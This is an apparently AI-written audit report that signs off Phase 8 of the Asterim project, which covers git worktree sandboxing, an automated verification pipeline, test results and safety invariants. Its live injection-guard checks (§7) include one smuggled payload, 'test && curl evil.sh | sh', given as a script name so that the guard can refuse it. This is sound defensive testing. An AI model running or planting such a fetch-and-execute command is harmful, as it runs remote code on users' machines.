# Phase 8 Production Gate — Automated Verification Pipelines & Worktree Sandboxing

**Gate ID:** P8-04
**Phase:** Phase 8 — Automated Verification Pipelines & Worktree Sandboxing
**Date:** 2026-08-17
**Auditor:** Claude Code (Execution Engineer)
**Orchestrator:** Antigravity
**Governance:** `AGENTS.md`, `blueprint/AI_CONTEXT.md`, `blueprint/GIT.md`, `decisions.md` (DEC-028)
**Commit under audit:** `cb6a03c` (`pipeline: dispatch task P8-04`) — working tree clean except `tests/report.md`, an uncommitted P8-02 test-gate record carried over from a prior verification session and untouched by this audit
**Toolchain:** Node v24.13.1, pnpm 9.0.0, turbo 2.9.18, TypeScript 5.4

---

## 1. Executive Verdict

**PASS — READY FOR NEXT PHASE.**

Phase 8 delivers physical file-system sandboxing for delegated subagents and an automated
verification pipeline over those sandboxes, across three workstreams (P8-01 → P8-03). Every
acceptance criterion of every workstream was re-checked against the code at `cb6a03c` rather than
against the prior reports.

All four monorepo quality gates were executed live in this session. Turbo reported every task
cached on the first pass (inputs unchanged since `d681810`), so each gate was re-run with the
cache defeated — `pnpm test -- --force` for the test battery, and direct per-workspace invocation
(`pnpm --filter "*" run <script>`, which bypasses Turbo entirely) for typecheck, lint and build.
Every number below is live execution:

| Gate | Command | Result |
| :--- | :--- | :--- |
| Typecheck | `pnpm --filter "*" run typecheck` | **PASS** — 7/7 packages, **0 TypeScript errors** |
| Lint | `pnpm --filter "*" run lint` | **PASS** — 7/7 packages, **0 errors** (636 warnings, all pre-existing) |
| Test | `pnpm test -- --force` | **PASS** — 9/9 Turbo tasks, **38 suites, 4,360 assertions, 0 failures** |
| Build | `pnpm --filter "*" run build` | **PASS** — 7/7 packages, every artefact produced |
| Turbo aggregate | `pnpm typecheck` / `pnpm lint` / `pnpm test` / `pnpm build` | **PASS** — 11/11, 7/7, 9/9, 11/11 tasks |

Beyond the suites, a **live end-to-end pass over the whole Phase 8 loop** was executed against a
throwaway git repository — provision, child edits, diff, verify, refuse-dirty, refuse-conflict,
clean merge, discard, orphan prune, injection guards — to settle the one thing a unit assertion
cannot claim on its own: that the primary working tree is never dirtied. **36/36 live checks
passed** (§7).

No product code was modified by this audit. No isolation guarantee, safety check or verification
timeout was weakened.

Three observations are recorded in §8. One of them — `CLAUDE.md`'s "there is no test runner
anywhere in the repo" section — is a factual error in a governance document that will mislead
every future agent that reads it. It is flagged rather than fixed, because `CLAUDE.md` is outside
this task's Implementation Scope.

---

## 2. Subsystem Audit Matrix

| # | Subsystem | Source of truth | Verdict | Evidence |
| :-: | :--- | :--- | :---: | :--- |
| 1 | **Worktree provisioning & isolation** | `GitWorktreeService.createWorktree` (`apps/server/src/services/git/GitWorktreeService.ts:257`) | **PASS** | `.asterim/worktrees/<threadId>` on `asterim/sandbox/<threadId>`; idempotent (an existing sandbox is returned, a git-forgotten directory is pruned and rebuilt); 111 assertions against real temp repositories + live checks 1–8 |
| 2 | **Base-commit tracking & clean diffing** | `WORKTREE_BASE_REF_PREFIX` (`:96`), `resolveBaseFor` (`:723`), `getDiff` (`:403`) | **PASS** | Base persisted as `refs/asterim/base/<threadId>` — outside `refs/heads`, invisible to `git branch`, survives restart and an empty database. One diff covers committed + staged + unstaged + untracked (`add --all --intent-to-add` in the *sandbox's* index). Live checks 3, 4, 9, 10 |
| 3 | **Non-dirtying merge** | `mergeWorktree` (`:467`) | **PASS** | Refuses `DIRTY_TARGET`, refuses `TARGET_NOT_CHECKED_OUT` (never checks a branch out under the operator), `git merge --abort` on conflict. Live checks 18–22: after a refused conflicting merge, HEAD is unmoved and `git status --porcelain` is empty |
| 4 | **Operator-only merge/discard** | `apps/server/src/routes/worktrees.ts:168,194`; `blueprint/GIT.md` | **PASS** | Merge and discard are REST verbs an operator issues; no agent meta-tool routes to either — `DELEGATION_TOOL_NAMES` (`packages/shared/src/types/delegation.ts:60`) is exactly `delegate_task` / `request_review` / `delegate_parallel`, and `McpAgentBridge.getDelegationTools` (`:142`) offers no others. The UI arms both with a two-click confirmation (`DelegationStatus.tsx:753,768`) |
| 5 | **Non-destructive exclusion** | `ensureIgnored` (`:359`) | **PASS** | Writes `.asterim/` to `$(git rev-parse --git-common-dir)/info/exclude`, never `.gitignore`; skips entirely when the project already ignores `.asterim`; a write failure is a warning, not a fault. Live check 6 asserts the exclude file carries it and `.gitignore` does not |
| 6 | **Teardown & branch safety** | `removeWorktree` (`:584`) | **PASS** | Removes directory, branch and base ref; `isWorktreeBranch` gates the `branch -D` so only `asterim/sandbox/*` can ever be deleted; removing an already-absent sandbox is success, not an error. Live checks 26–29 |
| 7 | **Orphan pruning** | `pruneOrphans` (`:639`), `AgentDelegationService.pruneOrphanSandboxes` (`:1464`), wired at `apps/server/src/index.ts:239` | **PASS** | Runs after `recoverDelegations`, unawaited. Scoped to paths inside `.asterim/worktrees` and refs under `asterim/sandbox/`; **skips every sandbox that still exists on disk**, so an unreviewed diff survives a restart. Live checks 30–32: the orphan was reclaimed, the live sandbox and a user branch (`feature/mine`) were untouched |
| 8 | **Pipeline auto-discovery** | `discoverPipeline` (`apps/server/src/services/verification/VerificationPipelineService.ts:145`), `detectPackageManager` (`:160`) | **PASS** | `.asterim/verification.json` / `pipeline.json` wins outright — including when it declares zero steps; otherwise `package.json` lifecycle scripts through the manager the lockfile names (pnpm/npm/yarn/bun), falling back to `packageManager`. Unreadable JSON falls through rather than failing. 196 assertions |
| 9 | **Three-valued verification status** | `runPipeline` (`:414`, `passed: results.length > 0 && failedSteps === 0`) | **PASS** | `passed` / `failed` / *nothing ran* are distinct; `totalSteps: 0` can never read as a pass in the Core or in the UI (`verificationStatusTone`, `an empty pipeline says so plainly` / `and never claims a pass`). Live check 17 |
| 10 | **Bounded process execution** | `runStep` (`:273`) | **PASS** | Per-step timeout (default 60s, hard cap 900s), SIGTERM → 5s grace → SIGKILL (`:363–367`), killed as a **process group** (`detached`, `process.kill(-pid)`) so a step's children die with it; `stdio: ['ignore', …]` so nothing blocks on a terminal. Never throws: a missing binary, an unspawnable shell and a hung watcher are all `passed: false` with a reason. Live checks 14–16 |
| 11 | **Bounded output capture** | `capture` / `bounded` (`:327–336`, `:124`) | **PASS** | Truncated **as it arrives**, not after the fact — a step printing a gigabyte is never held in memory. 50,000 chars per stream, head kept (where a compiler puts the first error) |
| 12 | **Command-injection surface** | `isSafeScriptName` (`packages/shared/src/types/verification.ts:97`), `quoteGitArg` (`GitWorktreeService.ts:107`), `isSafeWorktreeThreadId` (`packages/shared/src/types/worktree.ts:49`) | **PASS** | The only command Asterim assembles is `<manager> run <script>`, and the script name must match `^[A-Za-z0-9][A-Za-z0-9:._-]{0,63}$` — `package.json` is a file a delegated agent can write. Git arguments carrying `"`, `` ` ``, `$`, CR or LF are **refused**, not escaped. Thread ids are refused unless identifier-shaped and free of `..`. Live checks 35–36 |
| 13 | **Delegation lifecycle integration** | `provisionWorktree` (`AgentDelegationService.ts:1305`), `attachWorktreeChanges` (`:1358`), `attachVerification` (`:1403`) | **PASS** | Provision before the session starts; diff attached after it ends; verification after the diff. Defaults: sandbox on for `TASK`, verification on when there is a sandbox; explicit flags override both ways. A cancelled delegation is never verified. Every failure path is non-fatal — no repository, no commits or no git means the child runs in the project directory as before |
| 14 | **Evidence reaching the parent** | `formatDelegationReport` (`:1866–1890`), `compactVerificationReport` (`:1916`) | **PASS** | The brief carries `WORKTREE:`, changed files and a `VERIFICATION:` line with failing-step detail; the closing instruction changes to "The delegated work did not verify" when it did not. Diffs stay out of the brief (they are megabytes) and stay in the sandbox |
| 15 | **Persistence** | `DatabaseService.ts:635,640,652` | **PASS** | `threads.worktree_path`, `threads.worktree_branch`, `threads.verification_report_json` as `ALTER TABLE … ADD COLUMN` in try/catch — the established no-migration-framework pattern; existing `~/.asterim/asterim.db` files keep opening |
| 16 | **REST surface & auth** | `apps/server/src/routes/worktrees.ts`, registered at `index.ts:161` | **PASS** | All five routes (`GET /worktree`, `POST /worktree/merge`, `DELETE /worktree`, `POST /worktree/verify`, `GET /worktree/verify`) call `requireUser` first and 401 anonymously. `STATUS_BY_CODE` maps every `WorktreeErrorCode` to 400/404/409/500. `POST /verify` accepts **step names only** — a name that is not an ordinary identifier is a 400, so "authenticated" never means "may run arbitrary shell" |
| 17 | **Dashboard evidence & controls** | `apps/web/src/components/delegation/DelegationStatus.tsx` | **PASS** | Verification badge, step accordion with command/duration/exit code, bounded monospace failure output with Copy, diff preview tinted from `--color-state-*` tokens and capped at `MAX_DIFF_PREVIEW_LINES = 400` (`:398`), Re-run Verification (`:592`), two-click Merge/Discard (`:753,768`), `aria-expanded` on both toggles |
| 18 | **Store & hydration** | `apps/web/src/stores/useProjectStore.ts:970–1148` | **PASS** | `threadWorktrees` / `threadDiffs` / `threadVerificationReports` / `worktreeActions`; five actions over the P8-01/P8-02 endpoints; explicit `null` ("asked, and there is none") distinguished from an absent key, which is what stops a discarded sandbox falling back to a stale diff; a one-shot hydration effect restores evidence after reload |
| 19 | **Tree & modal surfacing** | `ThreadTree.tsx:69,248`, `DelegateModal.tsx:112,127,655,691` | **PASS** | `[sandbox]` badge titled `Isolated in <branch>` plus verification tick/cross per row; "Isolate in Git Worktree" / "Run Verification Pipeline" switches with `applySandboxOption` coupling (verification cannot be armed without a sandbox), forwarded on `POST /delegate` and through `parseParallelItems` |
| 20 | **Data sovereignty (DEC-028)** | §6 | **PASS** | No network primitive anywhere in the Phase 8 surface: git is the local CLI, verification is a local `spawn`, nothing leaves the workstation |

---

## 3. Workstream Acceptance-Criteria Audit

Each criterion is quoted from the brief that was dispatched for it (recovered from
`git show <dispatch-commit>:tasks/current.md`) and re-verified against the code at `cb6a03c`.

### 3.1 P8-01 — Git Worktree Sandboxing & Subagent Working Tree Isolation (`7a20aef`)

| # | Criterion | Verdict | Evidence |
| :-: | :--- | :---: | :--- |
| 1 | `GitWorktreeService` creates, diffs, merges and removes worktrees safely using native Git CLI | **PASS** | All four via `GitProvider.exec` (`git worktree add/remove/prune`, `git diff`, `git merge --no-ff`). No GitHub/GitLab API anywhere, per `blueprint/GIT.md`. 111/111 assertions + live checks 1–29 |
| 2 | `AgentDelegationService` runs subagents in isolated worktrees when requested | **PASS** | `provisionWorktree` (`:1305`) before session start; `context.worktreePath` routes the session; `AgentService` reads `threads.worktree_path`. Default on for `TASK`, `isolateWorktree` overrides both ways |
| 3 | Subagent modifications produce isolated diffs returned in `DelegationResult` | **PASS** | `attachWorktreeChanges` (`:1358`) sets `diff` / `changedFiles` / `worktreePath`; truncated at 200,000 chars and 500 paths for the event payload. Live checks 7–10 confirm the primary copy is byte-identical while the child works |
| 4 | REST endpoints support inspection, merging and discarding | **PASS** | `GET` / `POST /merge` / `DELETE` in `routes/worktrees.ts`, registered `index.ts:161`, all authenticated |
| 5 | `GitWorktreeService.test.ts` passes in real temporary git repositories | **PASS** | **111/111 assertions**, exit 0, 5 temp repositories created and cleaned |
| 6 | Monorepo CI gates pass with 0 errors | **PASS** | §1 |

### 3.2 P8-02 — Automated Verification Pipelines over Sandboxed Worktrees (`4b03321`)

| # | Criterion | Verdict | Evidence |
| :-: | :--- | :---: | :--- |
| 1 | Auto-discovery from `package.json` or `.asterim/verification.json` | **PASS** | `discoverPipeline` (`:145`); config wins outright, both array and `{steps: […]}` shapes, string entries name themselves via `deriveStepName`. Live check 11 |
| 2 | Sequential execution with per-step timeouts, process management and structured capture | **PASS** | `runPipeline` (`:414`) runs in order and **does not stop at the first failure** — a parent told only that typecheck failed cannot judge the rest. Timeout/kill escalation and bounded capture per matrix rows 10–11. Live checks 12–16 |
| 3 | Delegation runs verification in the sandbox and attaches the report | **PASS** | `attachVerification` (`:1403`) after the diff and after the child's process is stopped; `result.verificationReport = compactVerificationReport(report)`; persisted via `saveThreadVerificationReport` |
| 4 | `POST /worktree/verify` with authenticated access control | **PASS** | `requireUser` → 401; step names validated by `isSafeScriptName` → 400; `timeoutMs` clamped to `MAX_VERIFICATION_TIMEOUT_MS`; falls back to the project directory when the sandbox is gone (a merged-and-discarded thread's work is now *in* the project) |
| 5 | Orphan pruning safely wired into startup/recovery | **PASS** | `index.ts:239`, after `recoverDelegations`, unawaited; skips anything still on disk. Live checks 30–32 |
| 6 | `VerificationPipelineService.test.ts` passes in real temporary directories | **PASS** | **196/196 assertions**, exit 0, 48 temp directories created and cleaned |
| 7 | Monorepo CI gates, 38 test suites | **PASS** | §1, §4 — 38 suites |

**Known limit, carried forward from the P8-02 report and re-confirmed here:** a fresh worktree has
no `node_modules`, so `hasInstalledDependencies` (`:187`) makes `package.json` discovery return
nothing in a sandbox. This is deliberate — reporting a missing `tsc` as a failed typecheck is
exactly the false signal the subsystem exists to remove — and it means **`package.json`-derived
pipelines do not run in a sandbox today**. An explicit `.asterim/verification.json` is unaffected
and does run there (live check 11, via `configDir`). Recorded in §8 as the one item Phase 8 leaves
open by design.

### 3.3 P8-03 — Worktree Sandboxing & Verification Pipeline Dashboard UI (`d681810`)

| # | Criterion | Verdict | Evidence |
| :-: | :--- | :---: | :--- |
| 1 | Verification summary badges + collapsible step breakdown in both cards | **PASS** | `VerificationEvidence` used by `DelegationOutcomeCard` and `DelegationBatchOutcomeCard`; `Show Steps (n)` accordion, per-step pill/command/duration/exit code, starts closed |
| 2 | Failing steps render bounded monospace `stdoutSummary` / `stderrSummary` | **PASS** | 180px scrollable `<pre>` in `--font-family-mono`, labelled `<step> output`, Copy button; passing steps carry no diagnostic box |
| 3 | Changed-file counts, diff preview toggle, working Merge/Discard | **PASS** | Branch label, file count and list, tinted preview bounded at 400 lines with an elision line, two-click Merge/Discard. Store side proven end to end: URL, method, auth header, target branch, conflict, 409 refusal, spinner cleared |
| 4 | "Re-run Verification" triggers `POST /worktree/verify` and updates the UI | **PASS** | `verifyThreadWorktree` (`useProjectStore.ts:1119`) asserts exact URL, `POST`, Authorization header, **names never commands**, report replacement, and that a 500 leaves the last report alone |
| 5 | `ThreadTree` sandbox indicators and verification badges | **PASS** | `threadSandbox` (`:69`) reads the delegation brief with the thread row as fallback; badge at `:248` titled `Isolated in <branch>`; tick/cross carry the summary as tooltip; grandchildren inherit the props |
| 6 | `DelegateModal` worktree and verification toggles | **PASS** | `defaultSandboxOptions` (task/batch on, review off), `applySandboxOption` coupling, disabled state with its reason, both handlers driven; a silent form still sends `undefined` so the Core keeps its own defaults |
| 7 | `DelegationUI.test.ts` expanded and passing, exit 0 | **PASS** | 401 → **686/686 assertions**, exit 0 |
| 8 | Monorepo CI gates, 38 suites | **PASS** | §1, §4 |

**Scope note re-confirmed:** P8-03 made three pass-through changes in `apps/server`
(`POST /delegate` forwarding `verifyPipeline` / `verificationSteps`; `parseParallelItems` reading
all three sandbox fields; `requestReview` accepting the two verification fields). All three are
inside the pre-existing contract — the fields were already declared in `@asterim/shared` and
already read by the service. Without them the verification checkbox would have been decoration.
Step names remain filtered by `normalizeStepNames` / `isSafeScriptName`, so this adds no way to
introduce a command, only to choose among the ones the project already declares. **Audited and
accepted.**

---

## 4. Full Test Suite Inventory

38 suites, **4,360 assertions, 0 failures**, executed with `pnpm test -- --force` (0 of 9 Turbo
tasks cached; 1m27s wall clock).

### `asterim` (server) — 21 suites, 2,474 assertions

| Suite | Assertions |
| :--- | ---: |
| `services/memory/MemoryRelevanceEngine` | 63 |
| `services/memory/DecisionExtractor` | 60 |
| `routes/memory` | 140 |
| `routes/memory-candidates` | 52 |
| `routes/internal` | 51 |
| `services/git/GitDriftDetector` | 64 |
| `services/git/RemoteManager` | 89 |
| **`services/git/GitWorktreeService`** *(P8-01)* | **111** |
| `services/SovereignMode` | 21 |
| `services/ProjectMemoryService` | 231 |
| `services/PairingService` | 52 |
| `services/BillingService` | 102 |
| `services/mcp/McpProcessSupervisor` | 115 |
| `services/mcp/McpCapabilityDiscovery` | 89 |
| `services/mcp/McpToolInvocation` | 43 |
| `services/mcp/McpAgentBridge` | 67 |
| `services/mcp/AgentMcpIntegration` | 160 |
| `services/skills/SkillService` | 169 |
| `services/ai/ProfileService` | 138 |
| **`services/ai/AgentDelegationService`** *(P7 + P8-01/02/03)* | **461** |
| **`services/verification/VerificationPipelineService`** *(P8-02)* | **196** |

### `@asterim/web` — 8 suites, 1,444 assertions

| Suite | Assertions |
| :--- | ---: |
| `components/memory/DecisionExplorer` | 151 |
| `components/memory/CandidateReview` | 37 |
| `components/memory/MemoryTimeline` | 134 |
| `stores/useMemoryStore` | 113 |
| `components/mcp/McpServerExplorer` | 104 |
| `components/skills/SkillsExplorer` | 85 |
| `components/profiles/ProfileSelector` | 134 |
| **`components/delegation/DelegationUI`** *(P7-02/03/05 + P8-03)* | **686** |

### `@asterim/mcp-memory-server` — 7 suites, 348 assertions

`resolver` 42 · `record_decision` 82 · `retrieval_tools` 87 · `dogfood_scenario` 62 ·
`stdio_scaffold` 28 · `relay-client` 23 · `relay_e2e` 24

### `@asterim/relay` — 1 suite, 71 assertions · `@asterim/adapters` — 1 suite, 23 assertions

`relay` 71 · `sdk/ProcessManager` 23

### Phase 8 suites, standalone

| Suite | Result |
| :--- | :--- |
| `GitWorktreeService.test.ts` | **111/111**, exit 0 — 5 real temp repositories, cleaned |
| `VerificationPipelineService.test.ts` | **196/196**, exit 0 — 48 real temp directories, cleaned |
| `AgentDelegationService.test.ts` | **461/461**, exit 0 |
| `DelegationUI.test.ts` | **686/686**, exit 0 |

### Quality gate detail

- **Typecheck** — 7 packages, 0 errors: `packages/shared`, `packages/adapters`,
  `packages/mcp-memory-server`, `apps/relay`, `apps/marketing`, `apps/web`, `apps/server`.
  (`packages/eslint-config` declares no typecheck script.)
- **Lint** — 7 packages, **0 errors**, 636 warnings: shared 3, adapters 28, marketing 18, web 302,
  server 273, mcp-memory-server 12, relay 0. All warnings are pre-existing
  (`@typescript-eslint/no-explicit-any`, `react-refresh/only-export-components`, unused vars) and
  none originates in this audit, which changed no source file.
- **Build** — 7 packages: `tsc` for shared/adapters/relay, `tsc && vite build` for web (1,249
  modules; PWA service worker, 11 precache entries) and marketing (1,808 modules), `tsup` for
  server (907.54 KB CJS) and mcp-memory-server (86.41 KB). The server build copied
  `apps/web/dist` into `dist/web`, so the packaged binary still serves the dashboard.
- **CI parity** — `.github/workflows/ci.yml` runs typecheck → lint → test → build, the same four
  gates in the same order.

---

## 5. Safety Invariants & Security Boundaries

| Invariant | How it is held | Verified by |
| :--- | :--- | :--- |
| **The primary working tree is never dirtied** | Creation, diffing and teardown touch only `.asterim/worktrees/<threadId>` and refs under `asterim/sandbox/` + `refs/asterim/base/`. `getDiff` writes intent-to-add entries into the *sandbox's* index, a different file from the primary one | Live checks 5, 8, 22, 25, 29 — `git status --porcelain` empty after provisioning, during the child's work, after a refused conflicting merge, after a clean merge and after discard |
| **Merging is bounded on every side** | Refuses a dirty target; refuses a target that is not checked out rather than checking one out underneath the operator; `git merge --abort` on conflict; a no-op merge is reported as merged rather than faked | Live checks 18–22; `DIRTY_TARGET` / `TARGET_NOT_CHECKED_OUT` / `MERGE_CONFLICT` |
| **Merge and discard are operator actions** | REST verbs behind `requireUser`; no delegation meta-tool exposes either; the UI arms both with a two-click confirmation | `routes/worktrees.ts:168,194`; `DelegationStatus.tsx:753,768`; `blueprint/GIT.md` |
| **An agent's work is committed only on an ephemeral branch** | `commitSandbox` (`:557`) commits leftovers onto `asterim/sandbox/*` — never onto the operator's branch — and only because an operator asked for this merge | `GitWorktreeService.ts:463–465` (documented rationale), 111-assertion suite |
| **Only Asterim's own branches are ever deleted** | `isWorktreeBranch` gates `branch -D`; `pruneOrphans` scopes to `.asterim/worktrees` paths and the `asterim/sandbox/` ref prefix | Live check 32 — `feature/mine` survived a prune |
| **Nothing verification runs can take the Core down** | Timeout → SIGTERM → 5s → SIGKILL, killed as a process group; `runStep` never throws or rejects; stdin is `ignore`d; output bounded on arrival | Live checks 14–16; `VerificationPipelineService.test.ts` |
| **No shell ever sees a string Asterim assembled from untrusted input** | `<manager> run <script>` with `isSafeScriptName`; git args refuse `"`, `` ` ``, `$`, CR, LF; thread ids refuse `..` and non-identifiers. Configured commands are run as written — the point of the file, trusted exactly as much as the repository's own build scripts | Live checks 35–36; matrix row 12 |
| **`.asterim` never reaches a commit** | `.git/info/exclude` only, and only when `.gitignore` does not already cover it | Live check 6 |
| **A sandbox awaiting review is never reclaimed** | `pruneOrphans` skips every registered worktree whose directory still exists | Live check 31; `GitWorktreeService.ts:652` |
| **Nothing here is fatal to a delegation** | No repository, no commits, no git, a hand-deleted sandbox: each is a typed `WorktreeError` and the child runs in the project directory as before | Live checks 33–34; `AgentDelegationService.ts:1311–1345` |
| **Data sovereignty (DEC-028)** | Git is the local CLI via `GitProvider`; verification is a local `child_process.spawn`; the only network in the payload path is the operator's own Socket.IO/REST connection | §6 |

---

## 6. Data Sovereignty Attestation (DEC-028)

The Phase 8 surface — `GitWorktreeService`, `VerificationPipelineService`,
`threadVerificationStore`, `routes/worktrees.ts`, and the P8-01/02/03 additions to
`AgentDelegationService` — contains **no network primitive**: no `fetch`, no `http`/`https`
client, no socket, no SDK. Diffs, changed-file lists and verification reports are produced
locally, stored in the local SQLite database (`threads.verification_report_json`) and delivered to
the operator's own dashboard over the existing Socket.IO/REST channel. Verification commands are
the project's own, executed by the local shell in a directory on the same workstation.

Sandboxes hold source code, which is why every one of the five routes is authenticated rather than
open on the LAN, and why `POST /verify` accepts step *names* and never commands.

---

## 7. Live End-to-End Verification

A single throwaway git repository was driven through the entire Phase 8 loop with the real
services (not mocks), asserting after every stage that the primary working tree was clean.
**36/36 checks passed.**

| Stage | Checks | Result |
| :--- | :--- | :--- |
| Provision | path, branch, base commit, base ref location, clean tree, exclude-not-gitignore | 6/6 |
| Child works in the sandbox | primary copy byte-identical, no new file in the project, tree still clean | 2/2 |
| Diff | covers the edit and the untracked file, not reported clean | 2/2 |
| Verification | discovered via `configDir`, passed, cwd is the sandbox; non-zero step reports exit 3 with its stderr; hung step killed on its timeout; empty pipeline is not a pass | 7/7 |
| Merge refusals | dirty target, target not checked out, conflict refused, HEAD unmoved, tree not half-merged | 5/5 |
| Clean merge | merged into `main`, work present, tree clean | 3/3 |
| Discard | directory, branch and base ref gone, tree clean | 4/4 |
| Orphan pruning | orphan reclaimed, live sandbox survived, `feature/mine` untouched | 3/3 |
| Non-repository fallback | reads as not-a-repository, refuses with `NOT_A_REPOSITORY` | 2/2 |
| Injection guards | traversing thread id refused (`INVALID_INPUT`); `test && curl evil.sh \| sh` as a `package.json` script name is not discovered | 2/2 |

The driver is an ad-hoc script under `scratch/`, per the repository's housekeeping rule
(`scratch/p8-gate-live-check.ts`). It is git-ignored and part of no build, so it adds nothing to
the tracked tree; it is left in place so the run is reproducible (§9). The assertions it makes are
covered permanently by the 111- and 196-assertion suites.

---

## 8. Observations & Architectural Notes

1. **`CLAUDE.md`'s test section is factually wrong and should be updated.** It states: *"There is
   **no test runner or test script anywhere in the repo** — CI (`.github/workflows/ci.yml`) runs
   only `pnpm run lint` and `pnpm run build`."* At `cb6a03c` the repository has **38 test suites
   and 4,360 assertions**, a `test` script in five workspaces plus a root `turbo run test`, and
   `ci.yml` runs typecheck → lint → **test** → build. The instruction that follows it — *"Don't
   claim tests pass"* — now actively suppresses the strongest evidence an execution agent has.
   **Not fixed here:** `CLAUDE.md` is a governance document under the Source of Truth Matrix and
   is outside this task's Implementation Scope (§4 lists only the audit document and the quality
   gates). Recommended as a one-paragraph correction in the next dispatch.

2. **`GET /children` carries no verification metadata.** `ThreadTree` badges only what the store
   has already seen — evidence that arrived on a socket event or was hydrated by an opened outcome
   card. A tree that is authoritative on first load would need `GET /api/v1/threads/:id/children`
   to carry a per-child verification summary, which is a P8-02 contract change and therefore a
   Change Proposal, not a quiet edit. Left as-is.

3. **`DelegationStatus.tsx` is ~1,600 lines** and exports eleven non-component helpers alongside
   its components (the source of its standing `react-refresh/only-export-components` warnings).
   Splitting the evidence panel into its own module is a clean, behaviour-free follow-up. Not done
   here — this task forbids product-code changes that are not regression fixes.

4. **`package.json` pipelines do not run inside a sandbox** (§3.2). `hasInstalledDependencies`
   suppresses discovery in a directory with no `node_modules`, which is every fresh worktree. The
   suppression is correct — a missing `tsc` reported as a failed typecheck is worse than no
   report — but it means the default Node project gets *"nothing ran"* rather than a verdict from
   an automatic sandbox verification, unless the operator writes `.asterim/verification.json`.
   Options for a future phase, none of them attempted here: install into the sandbox before
   verifying (slow, disk-hungry), symlink or reuse the project's `node_modules` (breaks isolation
   in a way worth deciding explicitly), or verify after merge rather than before. **This is the one
   substantive functional gap Phase 8 knowingly leaves open, and it deserves a decision record
   rather than an implementation choice made by an execution agent.**

5. **Turbo's cache is total.** Every gate reported `FULL TURBO` on first invocation at `cb6a03c`.
   That is correct behaviour, but a gate audit that accepts a replayed log is not evidence, so
   every number in this document comes from an execution with the cache bypassed. Worth encoding
   in future gate briefs: `pnpm test -- --force`, and per-workspace `pnpm --filter "*" run <task>`
   for the tasks where `--force` is forwarded to `tsc` instead of to Turbo.

---

## 9. Reproduction

```bash
# Quality gates — cache defeated, so each result is live execution
pnpm test -- --force              # 38 suites, 4,360 assertions, 0 failures
pnpm --filter "*" run typecheck   # 7 packages, 0 errors
pnpm --filter "*" run lint        # 7 packages, 0 errors (636 pre-existing warnings)
pnpm --filter "*" run build       # 7 packages, all artefacts produced

# Turbo aggregates (cached after the above)
pnpm typecheck && pnpm lint && pnpm test && pnpm build

# The four Phase 8 suites, standalone
pnpm --filter asterim exec tsx src/services/git/__tests__/GitWorktreeService.test.ts
pnpm --filter asterim exec tsx src/services/verification/__tests__/VerificationPipelineService.test.ts
pnpm --filter asterim exec tsx src/services/ai/__tests__/AgentDelegationService.test.ts
pnpm --filter @asterim/web exec tsx src/components/delegation/__tests__/DelegationUI.test.ts

# The live end-to-end pass of §7 (git-ignored ad-hoc driver, no build depends on it)
pnpm --filter asterim exec tsx ../../scratch/p8-gate-live-check.ts
```

Note: `pnpm typecheck -- --force` and `pnpm build -- --force` forward `--force` to `tsc`, which
rejects it (`TS5093`). Use the per-workspace form above to defeat the cache for those two gates.

---

## 10. Sign-Off

| Role | Name | Verdict | Date |
| :--- | :--- | :--- | :--- |
| Execution Engineer / Auditor | Claude Code | **PASS — READY FOR NEXT PHASE** | 2026-08-17 |
| Orchestrator / Reviewer | Antigravity | *pending* | — |
| Product Director | Human Operator | *pending* | — |

**Scope of this sign-off.** Phase 8 workstreams P8-01, P8-02 and P8-03 at commit `cb6a03c`:
Git worktree sandboxing, the automated verification pipeline engine, their delegation-lifecycle
integration, the REST surface over both, and the operator dashboard UI. Verified by 38 automated
suites (4,360 assertions), 36 live end-to-end checks against a real repository, and four clean
quality gates. One functional gap is knowingly open and documented (§8.4) and one governance
document is factually stale (§8.1); neither blocks the phase.
